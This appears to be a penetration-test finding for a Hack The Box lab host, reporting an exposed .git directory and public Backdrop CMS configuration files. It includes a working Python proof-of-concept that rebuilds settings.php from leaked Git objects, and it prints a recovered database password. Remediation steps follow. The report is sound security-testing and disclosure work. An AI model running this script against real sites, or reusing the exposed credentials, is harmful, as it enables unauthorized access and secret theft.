# Public Exposure of Backdrop Configuration and Source Repository via Web Root

**ID:** vuln-0001
**Severity:** HIGH
**Found:** 2026-03-05 20:17:06 UTC
**Target:** http://dog.htb
**Endpoint:** /.git/HEAD, /.git/logs/HEAD, /.git/index, /files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/user.role.editor.json
**Method:** GET
**CWE:** CWE-200
**CVSS:** 8.2

## Description

The application exposes sensitive Backdrop CMS installation artifacts directly over HTTP. Two independent disclosure vectors were verified.
  
First, the Git repository metadata is accessible from the web root, including .git/HEAD, .git/logs/HEAD, .git/index, and individual object files. This allows reconstruction of tracked source files and commit metadata.
  
Second, the active Backdrop configuration directory under the public files path is directly browsable by path and serves JSON configuration files without authentication. The disclosed configuration includes role definitions, flood-control settings, and other application settings. Using the exposed Git object data, the main configuration file was also recovered, revealing the database connection string and hash salt.
  
This issue was discovered through direct HTTP requests to the exposed files and by reconstructing tracked objects referenced by the leaked Git index.

## Impact

An unauthenticated attacker can obtain highly sensitive internal application data, including source repository metadata, commit history, deployment details, active CMS configuration, authorization model, rate-limit settings, and the database connection string.
  
This materially reduces the effort required to compromise the application by enabling precise user enumeration, targeted password attacks, exploit selection by exact version, and potential credential reuse against backend services or administrative interfaces.
  
Business impact includes disclosure of internal security controls, exposure of secrets, accelerated compromise of application accounts, and increased likelihood of full application or host compromise when combined with other weaknesses.

## Technical Analysis

The root cause is unsafe publication of sensitive server-side artifacts inside the web-accessible document tree, combined with missing deny rules for Git metadata and Backdrop active configuration files.
  
Verified exposures include:
  
Overview
The application publishes a live .git directory and Backdrop configuration files beneath the public files directory.
  
Affected assets
The issue affects the primary web application at http://dog.htb.
  
Technical details
The following resources were directly accessible without authentication:
- http://dog.htb/.git/HEAD
- http://dog.htb/.git/logs/HEAD
- http://dog.htb/.git/index
- http://dog.htb/.git/COMMIT_EDITMSG
- http://dog.htb/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/user.role.editor.json
  
The leaked Git index exposed tracked file paths and object hashes. Using the referenced object for settings.php, the recovered configuration contained:
- Database DSN: mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop
- Hash salt value
- Active and staging config directory paths
  
The publicly accessible JSON configuration further exposed:
- User roles and permissions
- Authentication flood-control thresholds
- Site configuration details
- Administrative capability boundaries
  
This is a direct information disclosure vulnerability caused by improper deployment and missing access controls on sensitive files.

## Proof of Concept

To reproduce:
  
1. Request the exposed Git metadata:
   - GET http://dog.htb/.git/HEAD
   - GET http://dog.htb/.git/logs/HEAD
   - GET http://dog.htb/.git/index
  
2. Confirm that Git metadata is returned with HTTP 200 and that .git/index contains a valid DIRC header.
  
3. Request a publicly accessible active configuration file:
   - GET http://dog.htb/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/user.role.editor.json
  
4. Confirm that the JSON document is returned without authentication and contains role permissions.
  
5. Parse the leaked .git/index to identify the SHA-1 object for settings.php.
  
6. Fetch the corresponding Git object from:
   - /.git/objects/51/44053b7a821d02460db2e902007a20004dfa16
  
7. Decompress the object and observe that it contains the Backdrop settings.php file, including the database connection string and hash salt.

```
import requests
import struct
import zlib

BASE = "http://dog.htb"

def get(path: str) -> requests.Response:
    r = requests.get(BASE + path, timeout=15)
    print(f"{path} -> {r.status_code} ({len(r.content)} bytes)")
    return r

def parse_index(index_bytes: bytes) -> dict[str, str]:
    sig, version, entries = struct.unpack("!4sLL", index_bytes[:12])
    if sig != b"DIRC":
        raise ValueError("Not a Git index")
    offset = 12
    mapping = {}
    for _ in range(entries):
        header = index_bytes[offset:offset + 62]
        if len(header) < 62:
            break
        fields = struct.unpack("!LLLLLLLLLL20sH", header)
        sha1 = fields[10].hex()
        path_end = index_bytes.find(b"\\x00", offset + 62)
        path = index_bytes[offset + 62:path_end].decode("utf-8", "ignore")
        mapping[path] = sha1
        entry_len = ((62 + len(path) + 1 + 7) // 8) * 8
        offset += entry_len
    return mapping

def fetch_git_object(sha1: str) -> bytes:
    obj = get(f"/.git/objects/{sha1[:2]}/{sha1[2:]}")
    data = zlib.decompress(obj.content)
    nul = data.find(b"\\x00")
    return data[nul + 1:]

def main() -> None:
    get("/.git/HEAD")
    get("/.git/logs/HEAD")
    index = get("/.git/index").content
    config = get("/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/user.role.editor.json")
    print(config.text[:500])

    mapping = parse_index(index)
    settings_sha = mapping["settings.php"]
    print(f"settings.php sha1: {settings_sha}")

    settings_data = fetch_git_object(settings_sha).decode("utf-8", "ignore")
    print(settings_data[:1500])

if __name__ == "__main__":
    main()
```

## Remediation

1. Remove the .git directory and all version-control metadata from the web-accessible document root.
  
2. Move Backdrop active and staging configuration directories outside the public web root.
  
3. Rotate all exposed secrets immediately, including database passwords, salts, API credentials, and any credentials that may have been committed historically.
  
4. Add explicit web-server deny rules for:
   - .git
   - configuration directories
   - backup files
   - development artifacts
  
5. Review deployment processes to ensure development files, repository metadata, and sensitive configuration are excluded from published builds.
  
6. Reassess the environment for secondary compromise, including unauthorized account access, password reuse, and database exposure.
